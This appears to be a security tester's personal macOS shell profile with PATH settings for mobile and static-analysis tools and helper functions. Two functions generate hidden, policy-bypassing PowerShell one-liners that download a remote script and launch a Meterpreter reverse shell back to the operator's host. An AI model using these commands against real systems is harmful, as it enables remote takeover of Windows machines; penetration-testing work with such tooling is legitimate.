# Setting up PATH variables
export PATH=$PATH:/opt/local/bin/
export PATH=$PATH:/opt/local/sbin/
export PATH=$PATH:/Applications/AndroidSDK/sdk/tools:/Applications/AndroidSDK/sdk/platform-tools:/Applications/AndroidSDK/sdk/build-tools/android-4.4W
export PATH=$PATH:/Users/gds/Documents/resources/tools/mobile/android/apktool
export PATH=$PATH:/opt/mongodb/bin
export PATH=$PATH:/opt/theos/bin:/opt/theos/bin/ldid
export PATH=$PATH:/usr/local/sbin
export PATH=$PATH:/Applications/HP_Fortify/HP_Fortify_SCA_and_Apps_4.21/bin

export THEOS=/opt/theos
export THEOS_DEVICE_IP=127.0.0.1 THEOS_DEVICE_PORT=2222

export GRADLE_HOME=/opt/local/share/java/gradle
export PATH=$PATH:GRADLE_HOME/bin

export LESS=-m
export GREP_OPTIONS='--color=always'
export CLICOLOR=1
export LSCOLORS=GxFxCxDxBxegedabagaced


# Custom functions
POWERSHELL="powershell -nop -ep bypass -noni -w hidden -c \"[Net.WebRequest]::DefaultWebProxy.Credentials = [Net.CredentialCache]::DefaultCredentials; \$wc = new-object net.webclient; \$wc.Headers.Add(\\\"User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko\\\");"

# Powershell functions
function powershell-rev-https-msf {
	if [ -z $1 ]; then host=`en1`; else host=$1; fi;
	if [ -z $2 ]; then port=443; else port=$2; fi; 
	cmd="$POWERSHELL iex \$wc.downloadstring('http://$host/is.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $host -Lport 443 -Force -Proxy\"";
	echo $cmd; echo -n $cmd | pbcopy;
}

function powershell-rev-http-msf {
        if [ -z $1 ]; then host=`en1`; else host=$1; fi;
        if [ -z $2 ]; then port=80; else port=$2; fi;
        cmd="$POWERSHELL iex \$wc.downloadstring('http://$host/is.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_http -Lhost $host -Lport 80 -Force -Proxy\"";
	echo $cmd; echo -n $cmd | pbcopy;
}

# Helper functions
function end-of-line() { echo "CTRL+E mfer !"; }
function beginning-of-line() { echo "CTRL+A mfer !"; }

function txt() { 
	grep -i -r "${1:-8000}" ~/Documents/resources/cheat_sheets/txt; 
}

function gds() { 
	if [ -z "$@" ]; then
		cd ~/Documents/Work/Projects/
	else
		local d=`ls -d ~/Documents/Work/Projects/*$@*`;
		echo "$d" ;
		cd "$d" 2> /dev/null ;
	fi
}

function log() {
	#* Formatted date & time string.
	FORMATTED_DATE=`/bin/date "+%d-%m-%Y-%H%M%S"`

	#* Begin a new one
	/usr/bin/script -q ~/Terminal/Terminal-$FORMATTED_DATE.log
}

man() {
    env LESS_TERMCAP_mb=$'\E[01;31m' \
    LESS_TERMCAP_md=$'\E[01;38;5;74m' \
    LESS_TERMCAP_me=$'\E[0m' \
    LESS_TERMCAP_se=$'\E[0m' \
    LESS_TERMCAP_so=$'\E[38;5;246m' \
    LESS_TERMCAP_ue=$'\E[0m' \
    LESS_TERMCAP_us=$'\E[04;38;5;146m' \
    man "$@"
}
